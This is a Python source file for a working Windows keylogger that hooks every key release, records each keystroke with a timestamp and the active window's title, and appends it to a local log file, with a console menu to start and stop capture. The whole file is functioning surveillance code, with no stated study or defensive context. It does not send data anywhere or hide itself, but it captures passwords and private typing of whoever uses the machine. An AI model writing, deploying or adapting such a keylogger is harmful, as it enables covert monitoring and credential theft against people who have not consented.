import keyboard
import time
import datetime
import os
import win32gui
# Path to the log file
log_file = "./keystoke.log"

# Flag to control keylogging process
logging_enabled = False

def get_current_window_title():
    # Get the handle of the foreground window
    window_handle = win32gui.GetForegroundWindow()
    # Get the window title
    window_title = win32gui.GetWindowText(window_handle)
    return window_title

def log_keystroke(event):
    global logging_enabled
    if logging_enabled:
        key = event.name
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window_title = get_current_window_title()
        # Check if the pressed key is printable (letters, numbers, symbols, etc.)
        if len(key) == 1:
            # Open the log file in append mode and write the pressed key with timestamp and window title
            with open(log_file, "a") as f:
                f.write(f"[{timestamp}] [{window_title}] {key}\n")
        elif key == "space":
            with open(log_file, "a") as f:
                f.write(f"[{timestamp}] [{window_title}] [Space]\n")
        elif key == "enter":
            with open(log_file, "a") as f:
                f.write(f"[{timestamp}] [{window_title}] [Enter]\n")
        else:
            # If it's a special key (like arrow keys, function keys), just log the key name
            with open(log_file, "a") as f:
                f.write(f"[{timestamp}] [{window_title}] [{key}]\n")

def start_keylogger():
    global logging_enabled
    if not logging_enabled:
        logging_enabled = True
        print("Keylogger started.")
        keyboard.on_release(log_keystroke)

def stop_keylogger():
    global logging_enabled
    if logging_enabled:
        logging_enabled = False
        print("Keylogger stopped.")
        keyboard.unhook_all()

def main():
    global log_file
    # Check if log file exists, if not create it
    if not os.path.isfile(log_file):
        open(log_file, 'a').close()

    while True:
        print("\nMenu:")
        print("1. Start Keylogger")
        print("2. Stop Keylogger")
        print("3. Exit")
        choice = input("Enter your choice: ")

        if choice == "1":
            start_keylogger()
        elif choice == "2":
            stop_keylogger()
        elif choice == "3":
            break
        else:
            print("Invalid choice. Please enter a valid option.")

if __name__ == "__main__":
    main()